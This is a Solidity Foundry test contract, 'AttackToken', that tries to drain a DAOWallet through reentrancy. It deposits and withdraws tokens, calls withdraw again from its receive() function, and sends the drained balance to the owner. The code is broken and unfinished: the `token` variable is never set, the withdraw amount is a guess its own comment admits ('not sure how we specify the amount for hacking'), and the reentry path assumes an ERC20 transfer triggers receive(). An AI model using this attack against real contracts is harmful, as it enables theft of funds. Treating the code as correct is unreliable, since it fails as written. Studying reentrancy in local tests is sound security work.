// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import { DAOWallet } from "./DAOWallet.sol";
import { MockERC20 } from "../mocks/MockERC20.sol";

contract AttackToken is Test {
    DAOWallet public target;
    address public owner;
    MockERC20 public token;
    address public tokenAddress;

    constructor (address payable _target, address _token) payable {
        target = DAOWallet(_target);
        owner = msg.sender;
        tokenAddress = _token;
    }

    function attack(uint amount) external payable {
        target.deposit(tokenAddress, amount);
        target.withdraw(tokenAddress, amount);
    }

    receive() external payable {
        if (token.balanceOf(address(target)) > 0) {
            emit log_named_uint("attack contract balance", token.balanceOf(address(target)));
            target.withdraw(address(token), 60); // not sure how we specify the amount for hacking
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    function getContractTokenBalance() public view returns(uint) {
        return token.balanceOf(address(this));
    }
}